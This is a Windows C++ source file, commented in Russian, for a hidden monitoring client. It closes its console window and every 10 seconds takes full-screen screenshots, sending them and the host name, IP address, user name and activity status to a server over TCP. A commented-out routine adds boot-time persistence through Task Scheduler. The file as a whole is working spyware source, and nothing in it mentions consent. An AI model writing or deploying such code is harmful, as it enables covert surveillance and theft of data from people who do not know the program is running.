#include <windows.h> // Подключение библиотеки Windows API
#include <iostream> // Подключение библиотеки для ввода-вывода
#include <winsock2.h> // Подключение библиотеки Winsock для сетевого программирования
#include <string> // Подключение библиотеки для работы со строками
#include <cstring> // Подключение библиотеки для работы с C-строками
#include <ws2tcpip.h> // Подключение библиотеки для работы с TCP/IP
#include <chrono> // Подключение библиотеки для работы с временем
#include <thread> // Подключение библиотеки для работы с потоками

#pragma comment(lib, "ws2_32.lib") // Подключение библиотеки Winsock

/* Данная функция использует COM для взаимодействия с Планировщиком задач Windows. Он создает задачу, которая будет запускаться при загрузке системы.
Для компиляции этого кода вам могут понадобиться библиотеки taskschd.lib и comsupp.lib. Убедитесь, что они подключены в вашем проекте.

void CreateTask() {
    // Путь к исполняемому файлу клиента
    std::string exePath = "C:\\Path\\To\\Your\\Client.exe"; // Замените на реальный путь к вашему исполняемому файлу

    // Имя задачи
    const char* taskName = "MyClientTask";

    // Создаем объект COM для работы с планировщиком задач
    CoInitializeEx(NULL, COINIT_MULTITHREADED);
    CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT,
                         RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);

    ITaskService* pService = NULL;
    HRESULT hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService);
    if (SUCCEEDED(hr)) {
        // Подключаемся к службе планировщика задач
        hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
        if (SUCCEEDED(hr)) {
            // Создаем задачу
            ITaskDefinition* pTask = NULL;
            hr = pService->NewTask(0, &pTask);
            if (SUCCEEDED(hr)) {
                // Устанавливаем параметры задачи
                IRegistrationInfo* pRegInfo = NULL;
                pTask->get_RegistrationInfo(&pRegInfo);
                pRegInfo->put_Author(_bstr_t("YourName")); // Замените на ваше имя

                // Устанавливаем триггер
                ITriggerCollection* pTriggerCollection = NULL;
                pTask->get_Triggers(&pTriggerCollection);
                ITrigger* pTrigger = NULL;
                pTriggerCollection->Create(TASK_TRIGGER_BOOT, &pTrigger);
                pTrigger->Release();

                // Устанавливаем действие
                IActionCollection* pActionCollection = NULL;
                pTask->get_Actions(&pActionCollection);
                IAction* pAction = NULL;
                pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
                IExecAction* pExecAction = NULL;
                pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
                pExecAction->put_Path(_bstr_t(exePath.c_str()));

                // Сохраняем задачу
                ITaskFolder* pRootFolder = NULL;
                pService->GetFolder(_bstr_t("\\"), &pRootFolder);
                pRootFolder->RegisterTaskDefinition(
                    _bstr_t(taskName),
                    pTask,
                    TASK_CREATE_OR_UPDATE,
                    _variant_t(),
                    _variant_t(),
                    TASK_LOGON_INTERACTIVE_TOKEN,
                    _variant_t(),
                    NULL
                );

                // Освобождаем ресурсы
                pRootFolder->Release();
                pTask->Release();
                pService->Release();
                pActionCollection->Release();
                pTriggerCollection->Release();
                pRegInfo->Release();
                CoUninitialize();
            }
        }
    }
}
*/


// Функция для захвата скриншота и сохранения его в файл
void CaptureScreenshot(const std::string& filename) {
    HDC hdcScreen = GetDC(NULL); // Получаем контекст устройства для всего экрана
    HDC hdcMem = CreateCompatibleDC(hdcScreen); // Создаем совместимый контекст устройства
    int width = GetDeviceCaps(hdcScreen, HORZRES); // Получаем ширину экрана
    int height = GetDeviceCaps(hdcScreen, VERTRES); // Получаем высоту экрана
    
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height); // Создаем битмап
    SelectObject(hdcMem, hBitmap); // Выбираем битмап в контекст устройства
    BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY); // Копируем экран в битмап
    
    BITMAPFILEHEADER bmfHeader = {0}; // Инициализация заголовка файла
    BITMAPINFOHEADER bi; // Создаем заголовок информации о битмапе
    bi.biSize = sizeof(BITMAPINFOHEADER); // Устанавливаем размер заголовка
    bi.biWidth = width; // Устанавливаем ширину
    bi.biHeight = height; // Устанавливаем высоту
    bi.biPlanes = 1; // Устанавливаем количество цветовых плоскостей
    bi.biBitCount = 24; // Устанавливаем количество бит на пиксель
    bi.biCompression = BI_RGB; // Устанавливаем тип сжатия
    bi.biSizeImage = 0; // Размер изображения
    bi.biXPelsPerMeter = 0; // Горизонтальное разрешение
    bi.biYPelsPerMeter = 0; // Вертикальное разрешение
    bi.biClrUsed = 0; // Количество используемых цветов
    bi.biClrImportant = 0; // Количество важных цветов

    DWORD dwSize = ((width * bi.biBitCount + 31) / 32) * 4 * height; // Вычисляем размер данных
    BYTE* pPixels = new BYTE[dwSize]; // Выделяем память для пикселей
    GetDIBits(hdcScreen, hBitmap, 0, height, pPixels, (BITMAPINFO*)&bi, DIB_RGB_COLORS); // Получаем данные пикселей

    HANDLE hFile = CreateFileA(filename.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); // Создаем файл для записи
    if (hFile != INVALID_HANDLE_VALUE) { // Проверяем, успешно ли создан файл
        DWORD dwWritten; // Переменная для хранения количества записанных байтов
        WriteFile(hFile, &bmfHeader, sizeof(bmfHeader), &dwWritten, NULL); // Записываем заголовок файла
        WriteFile(hFile, &bi, sizeof(bi), &dwWritten, NULL); // Записываем заголовок информации
        WriteFile(hFile, pPixels, dwSize, &dwWritten, NULL); // Записываем данные пикселей
        CloseHandle(hFile); // Закрываем файл
    } else {
        std::cerr << "Ошибка создания файла: " << GetLastError() << std::endl; // Выводим ошибку
    }

    delete[] pPixels; // Освобождаем память для пикселей
    DeleteObject(hBitmap); // Удаляем битмап
    DeleteDC(hdcMem); // Удаляем контекст устройства
    ReleaseDC(NULL, hdcScreen); // Освобождаем контекст устройства экрана
}

// Функция для отправки файла на сервер
void SendFileToServer(const std::string& filename, const std::string& serverIP) {
    WSADATA wsaData; // Структура для инициализации Winsock
    SOCKET sock; // Сокет
    sockaddr_in serverAddr; // Структура для хранения адреса сервера

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) { // Инициализация Winsock
        std::cerr << "Ошибка инициализации Winsock." << std::endl; // Выводим ошибку
        return; // Выходим из функции
    }

    sock = socket(AF_INET, SOCK_STREAM, 0); // Создаем сокет
    if (sock == INVALID_SOCKET) { // Проверяем, успешно ли создан сокет
        std::cerr << "Ошибка создания сокета." << std::endl; // Выводим ошибку
        WSACleanup(); // Очищаем Winsock
        return; // Выходим из функции
    }

    serverAddr.sin_family = AF_INET; // Устанавливаем семейство адресов
    serverAddr.sin_port = htons(8080); // Устанавливаем порт сервера
    inet_pton(AF_INET, serverIP.c_str(), &serverAddr.sin_addr); // Преобразуем IP-адрес в формат

    if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) { // Подключаемся к серверу
        std::cerr << "Ошибка подключения к серверу." << std::endl; // Выводим ошибку
        closesocket(sock); // Закрываем сокет
        WSACleanup(); // Очищаем Winsock
        return; // Выходим из функции
    }

    HANDLE hFile = CreateFileA(filename.c_str(), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); // Открываем файл для чтения
    if (hFile == INVALID_HANDLE_VALUE) { // Проверяем, успешно ли открыт файл
        std::cerr << "Ошибка открытия файла: " << GetLastError() << std::endl; // Выводим ошибку
        closesocket(sock); // Закрываем сокет
        WSACleanup(); // Очищаем Winsock
        return; // Выходим из функции
    }

    DWORD fileSize = GetFileSize(hFile, NULL); // Получаем размер файла
    BYTE* buffer = new BYTE[fileSize]; // Выделяем память для буфера
    DWORD bytesRead; // Переменная для хранения количества прочитанных байтов
    if (ReadFile(hFile, buffer, fileSize, &bytesRead, NULL)) { // Читаем файл
        send(sock, (char*)&fileSize, sizeof(fileSize), 0); // Отправляем размер файла
        send(sock, (char*)buffer, fileSize, 0); // Отправляем данные файла
    } else {
        std::cerr << "Ошибка чтения файла: " << GetLastError() << std::endl; // Выводим ошибку
    }

    CloseHandle(hFile); // Закрываем файл
    delete[] buffer; // Освобождаем память для буфера
    closesocket(sock); // Закрываем сокет
    WSACleanup(); // Очищаем Winsock
}

// Функция для фонового выполнения задач
void RunInBackground() {
    std::string serverIP = "127.0.0.1"; // Укажите IP-адрес сервера
    while (true) { // Бесконечный цикл
        CaptureScreenshot("screenshot.bmp"); // Захватываем скриншот
        SendFileToServer("screenshot.bmp", serverIP); // Отправляем файл на сервер
        std::this_thread::sleep_for(std::chrono::seconds(10)); // Ждем 10 секунд
    }
}

// Функция для получения текущего времени в виде строки
std::string getCurrentTimeAsString() {
    auto now = std::chrono::system_clock::now(); // Получаем текущее время
    std::time_t now_time = std::chrono::system_clock::to_time_t(now); // Преобразуем в time_t
    return std::ctime(&now_time); // Возвращаем строку времени
}

// Функция для получения информации о системе
std::string GetSystemInfo(int status) {
    WSADATA wsaData; // Структура для инициализации Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) { // Инициализация Winsock
        return "Ошибка инициализации Winsock"; // Возвращаем сообщение об ошибке
    }

    char hostname[256]; // Буфер для хранения имени хоста
    if (gethostname(hostname, sizeof(hostname)) != 0) { // Получаем имя хоста
        WSACleanup(); // Очищаем Winsock
        return "Ошибка получения имени хоста"; // Возвращаем сообщение об ошибке
    }

    struct addrinfo hints, *res; // Структуры для хранения информации о адресах
    memset(&hints, 0, sizeof hints); // Обнуляем структуру hints
    hints.ai_family = AF_INET; // Устанавливаем семейство адресов
    hints.ai_socktype = SOCK_STREAM; // Устанавливаем тип сокета

    if (getaddrinfo(hostname, NULL, &hints, &res) != 0) { // Получаем адреса
        WSACleanup(); // Очищаем Winsock
        return "Ошибка получения IP адреса"; // Возвращаем сообщение об ошибке
    }

    char ip[INET_ADDRSTRLEN]; // Буфер для хранения IP-адреса
    if (inet_ntop(AF_INET, &((struct sockaddr_in*)res->ai_addr)->sin_addr, ip, sizeof(ip)) == NULL) { // Преобразуем адрес в строку
        freeaddrinfo(res); // Освобождаем память
        WSACleanup(); // Очищаем Winsock
        return "Ошибка преобразования IP адреса"; // Возвращаем сообщение об ошибке
    }
    freeaddrinfo(res); // Освобождаем память

    char username[256]; // Буфер для хранения имени пользователя
    DWORD username_len = sizeof(username); // Длина буфера
    if (GetUserNameA(username, &username_len) == 0) { // Получаем имя пользователя
        WSACleanup(); // Очищаем Winsock
        return "Ошибка получения имени пользователя"; // Возвращаем сообщение об ошибке
    }

    std::string status_s = (status == 0) ? "Online" : "Wait"; // Определяем статус
    std::string currentTime = getCurrentTimeAsString(); // Получаем текущее время
    WSACleanup(); // Очищаем Winsock

    return std::string("Host: ") + hostname + ", IP: " + ip + ", User: " + username + " Status: " + status_s + " Time: " + currentTime; // Возвращаем информацию о системе
}

// Функция для проверки активности пользователя
bool isUserActive() {
    LASTINPUTINFO lii; // Структура для хранения информации о последнем вводе
    lii.cbSize = sizeof(LASTINPUTINFO); // Устанавливаем размер структуры
    if (!GetLastInputInfo(&lii)) { // Получаем информацию о последнем вводе
        return false; // Возвращаем false в случае ошибки
    }

    DWORD currentTime = GetTickCount(); // Получаем текущее время
    DWORD idleTime = currentTime - lii.dwTime; // Вычисляем время бездействия

    return (idleTime < 5 * 60 * 1000); // Возвращаем true, если пользователь активен
}

// Функция для отправки данных на сервер
void sendDataToServer(const std::string& data) {
    WSADATA wsaData; // Структура для инициализации Winsock
    SOCKET sock; // Сокет
    sockaddr_in serverAddr; // Структура для хранения адреса сервера

    // Инициализация Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) { // Инициализация Winsock
        std::cerr << "Ошибка инициализации Winsock." << std::endl; // Выводим ошибку
        return; // Выходим из функции
    }

    // Создание сокета
    sock = socket(AF_INET, SOCK_STREAM, 0); // Создаем сокет
    if (sock == INVALID_SOCKET) { // Проверяем, успешно ли создан сокет
        std::cerr << "Ошибка создания сокета." << std::endl; // Выводим ошибку
        WSACleanup(); // Очищаем Winsock
        return; // Выходим из функции
    }

    // Настройка адреса сервера
    serverAddr.sin_family = AF_INET; // Устанавливаем семейство адресов
    serverAddr.sin_port = htons(8080); // Устанавливаем порт сервера

    // Преобразование IP-адреса в формат, используемый в sockaddr_in
    inet_pton(AF_INET, "127.0.0.1", &serverAddr.sin_addr); // Замените на IP-адрес вашего сервера, если нужно

    // Подключение к серверу
    if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) { // Подключаемся к серверу
        std::cerr << "Ошибка подключения к серверу." << std::endl; // Выводим ошибку
        closesocket(sock); // Закрываем сокет
        WSACleanup(); // Очищаем Winsock
        return; // Выходим из функции
    }

    // Отправка данных на сервер
    send(sock, data.c_str(), data.size(), 0); // Отправляем данные

    // Закрытие сокета
    closesocket(sock); // Закрываем сокет
    WSACleanup(); // Очищаем Winsock
}

// Главная функция
int main() {
    //CreateTask(); // Создаем задачу при запуске
    int status = 0; // Переменная для хранения статуса пользователя
    // Запуск в фоновом режиме
    FreeConsole(); // Удаляем консольное окно
    std::thread backgroundThread(RunInBackground); // Создаем поток для фоновой работы
    backgroundThread.detach(); // Отделяем поток

    while (true) { // Бесконечный цикл
        if (isUserActive()) { // Проверяем активность пользователя
            status = 0; // Пользователь активен
        } else {
            status = 1; // Пользователь неактивен
        }

        std::string systemInfo = GetSystemInfo(status); // Получаем информацию о системе
        std::cout << systemInfo << std::endl; // Выводим информацию о системе

        // Отправляем данные на сервер
        sendDataToServer(systemInfo); // Отправляем данные

        std::this_thread::sleep_for(std::chrono::seconds(10)); // Ждем 10 секунд
    }

    return 0; // Возвращаем 0 при завершении программы
}
